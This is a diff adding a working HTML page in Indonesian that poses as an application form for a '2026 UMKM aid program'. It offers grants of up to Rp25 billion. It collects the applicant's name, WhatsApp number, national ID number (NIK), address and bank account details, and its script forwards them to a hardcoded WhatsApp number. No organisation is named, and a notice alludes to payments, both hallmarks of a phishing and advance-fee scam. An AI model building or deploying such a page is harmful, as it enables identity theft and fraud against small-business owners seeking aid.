@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Formulir Pengajuan Bantuan UMKM 2026</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #f2f5f9;
+      color: #222;
+    }
+
+    .header {
+      background: #0b5ed7;
+      color: white;
+      padding: 28px 20px;
+      text-align: center;
+    }
+
+    .header h1 {
+      margin: 0 0 10px;
+      font-size: 25px;
+    }
+
+    .header p {
+      margin: 0;
+      font-size: 15px;
+    }
+
+    .container {
+      max-width: 650px;
+      margin: 25px auto;
+      padding: 0 15px;
+    }
+
+    .card {
+      background: white;
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+      margin-bottom: 20px;
+    }
+
+    .card h2 {
+      margin-top: 0;
+      color: #0b5ed7;
+      font-size: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 7px;
+      font-weight: bold;
+    }
+
+    input,
+    textarea {
+      width: 100%;
+      padding: 13px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+      outline: none;
+    }
+
+    input:focus,
+    textarea:focus {
+      border-color: #0b5ed7;
+    }
+
+    textarea {
+      min-height: 90px;
+      resize: vertical;
+    }
+
+    .paket {
+      border: 1px solid #ddd;
+      padding: 14px;
+      border-radius: 9px;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+
+    .paket:hover {
+      border-color: #0b5ed7;
+      background: #f5f9ff;
+    }
+
+    .paket input {
+      width: auto;
+      margin-right: 8px;
+    }
+
+    .nominal {
+      font-weight: bold;
+      color: #0b5ed7;
+    }
+
+    .catatan {
+      background: #fff8e1;
+      border-left: 4px solid #f0ad00;
+      padding: 14px;
+      margin-top: 20px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .keamanan {
+      background: #eaf7ee;
+      border-left: 4px solid #25a05a;
+      padding: 14px;
+      margin-top: 15px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .btn {
+      width: 100%;
+      border: none;
+      padding: 15px;
+      border-radius: 9px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+      background: #25d366;
+      color: white;
+    }
+
+    .btn:hover {
+      background: #1ebe5d;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 25px;
+      color: #777;
+      font-size: 13px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="header">
+    <h1>Program Bantuan Dana UMKM Tahun 2026</h1>
+    <p>Formulir Pengajuan Bantuan UMKM</p>
+  </div>
+
+  <div class="container">
+
+    <div class="card">
+
+      <h2>Data Pendaftar</h2>
+
+      <form id="formUMKM">
+
+        <label>Nama Lengkap</label>
+        <input
+          type="text"
+          id="nama"
+          placeholder="Masukkan nama lengkap"
+          required
+        >
+
+        <label>Nomor WhatsApp</label>
+        <input
+          type="tel"
+          id="nomor"
+          placeholder="Contoh: 081234567890"
+          required
+        >
+
+        <label>NIK</label>
+        <input
+          type="text"
+          id="nik"
+          inputmode="numeric"
+          placeholder="Masukkan NIK"
+          required
+        >
+
+        <label>Alamat</label>
+        <textarea
+          id="alamat"
+          placeholder="Masukkan alamat lengkap"
+          required
+        ></textarea>
+
+        <label>Jenis Usaha</label>
+        <input
+          type="text"
+          id="usaha"
+          placeholder="Contoh: Toko sembako"
+          required
+        >
+
+
+        <!-- PILIHAN BANTUAN -->
+
+        <label>Pilih Jumlah Bantuan</label>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp100 - 300 juta" required>
+          Bantuan <span class="nominal">Rp100 - 300 juta</span>
+        </div>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp400 - 600 juta">
+          Bantuan <span class="nominal">Rp400 - 600 juta</span>
+        </div>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp700 - 900 juta">
+          Bantuan <span class="nominal">Rp700 - 900 juta</span>
+        </div>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp1 - 1,5 Miliar">
+          Bantuan <span class="nominal">Rp1 - 1,5 Miliar</span>
+        </div>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp1,5 - 2 Miliar">
+          Bantuan <span class="nominal">Rp1,5 - 2 Miliar</span>
+        </div>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp2 - 3 Miliar">
+          Bantuan <span class="nominal">Rp2 - 3 Miliar</span>
+        </div>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp3 - 5 Miliar">
+          Bantuan <span class="nominal">Rp3 - 5 Miliar</span>
+        </div>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp5 - 10 Miliar">
+          Bantuan <span class="nominal">Rp5 - 10 Miliar</span>
+        </div>
+
+        <div class="paket">
+          <input type="radio" name="paket" value="Rp10 - 25 Miliar">
+          Bantuan <span class="nominal">Rp10 - 25 Miliar</span>
+        </div>
+
+
+        <!-- DATA REKENING -->
+
+        <h2 style="margin-top:30px;">
+          Data Rekening Penerima
+        </h2>
+
+        <label>Nama Bank</label>
+        <input
+          type="text"
+          id="bank"
+          placeholder="Contoh: BRI"
+          required
+        >
+
+        <label>Nama Pemilik Rekening</label>
+        <input
+          type="text"
+          id="pemilikRekening"
+          placeholder="Sesuai nama pemilik rekening"
+          required
+        >
+
+        <label>Nomor Rekening</label>
+        <input
+          type="text"
+          id="rekening"
+          inputmode="numeric"
+          placeholder="Masukkan nomor rekening"
+          required
+        >
+
+        <div class="keamanan">
+          <strong>Keamanan data:</strong><br>
+          Jangan masukkan PIN ATM, password mobile banking,
+          OTP, CVV, atau kode keamanan lainnya ke dalam formulir ini.
+        </div>
+
+
+        <!-- INFORMASI -->
+
+        <div class="catatan">
+          <strong>Informasi penting:</strong><br>
+          Pengajuan melalui formulir ini tidak otomatis berarti
+          pendaftar menerima bantuan. Pastikan informasi mengenai
+          program, penyelenggara, persyaratan, dan ketentuan pembayaran
+          telah diverifikasi melalui sumber resmi sebelum melakukan
+          pembayaran apa pun.
+        </div>
+
+
+        <button type="submit" class="btn">
+          KIRIM DATA MELALUI WHATSAPP
+        </button>
+
+      </form>
+
+    </div>
+
+  </div>
+
+  <div class="footer">
+    Formulir Pengajuan UMKM 2026
+  </div>
+
+
+  <script>
+
+    document
+      .getElementById("formUMKM")
+      .addEventListener("submit", function(e) {
+
+        e.preventDefault();
+
+        const nama =
+          document.getElementById("nama").value;
+
+        const nomor =
+          document.getElementById("nomor").value;
+
+        const nik =
+          document.getElementById("nik").value;
+
+        const alamat =
+          document.getElementById("alamat").value;
+
+        const usaha =
+          document.getElementById("usaha").value;
+
+        const bank =
+          document.getElementById("bank").value;
+
+        const pemilikRekening =
+          document.getElementById("pemilikRekening").value;
+
+        const rekening =
+          document.getElementById("rekening").value;
+
+        const paketElement =
+          document.querySelector(
+            'input[name="paket"]:checked'
+          );
+
+        if (!paketElement) {
+          alert("Silakan pilih jumlah bantuan.");
+          return;
+        }
+
+        const paket =
+          paketElement.value;
+
+
+        const pesan =
+`FORMULIR PENGAJUAN BANTUAN UMKM 2026
+
+DATA PENDAFTAR
+Nama Lengkap: ${nama}
+Nomor WhatsApp: ${nomor}
+NIK: ${nik}
+
+Alamat:
+${alamat}
+
+Jenis Usaha:
+${usaha}
+
+JUMLAH BANTUAN
+${paket}
+
+DATA REKENING
+Nama Bank: ${bank}
+Nama Pemilik Rekening: ${pemilikRekening}
+Nomor Rekening: ${rekening}
+
+Catatan:
+Saya telah mengisi data pengajuan dengan benar.`;
+
+
+        /*
+          NOMOR WHATSAPP TUJUAN
+          Format: 62xxxxxxxxxx
+          tanpa tanda +
+        */
+
+        const nomorTujuan =
+          "6281958234821";
+
+
+        const url =
+          "https://wa.me/" +
+          nomorTujuan +
+          "?text=" +
+          encodeURIComponent(pesan);
+
+
+        window.open(url, "_blank");
+
+      });
+
+  </script>
+
+</body>
+</html>
